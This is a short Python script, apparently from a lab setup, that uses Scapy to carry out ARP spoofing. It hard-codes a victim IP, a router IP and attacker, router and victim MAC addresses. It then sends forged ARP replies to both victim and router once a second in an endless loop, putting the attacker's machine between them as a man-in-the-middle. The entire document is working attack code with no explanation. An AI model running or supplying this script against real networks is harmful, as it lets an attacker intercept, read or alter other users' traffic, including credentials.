import sys
from scapy.all import *
import time

ip_victim = "10.0.0.100"
ip_router = "10.0.0.1"
hw_attacker = "08:00:27:96:06:36"
hw_router = "08:00:27:9a:9d:74"
hw_victim = "08:00:27:48:ea:9a"

arp_to_victim = Ether(src=hw_attacker, dst=hw_victim)/ARP(op=2, psrc=ip_router,
                                                          pdst=ip_victim, hwsrc=hw_attacker, hwdst=hw_victim)
arp_to_router = Ether(src=hw_attacker, dst=hw_router)/ARP(op=2, psrc=ip_victim,
                                                          pdst=ip_router, hwsrc=hw_attacker, hwdst=hw_router)

if not arp_to_victim or not arp_to_router:
    exit()

while (True):
    sendp(arp_to_victim)
    sendp(arp_to_router)
    time.sleep(1)
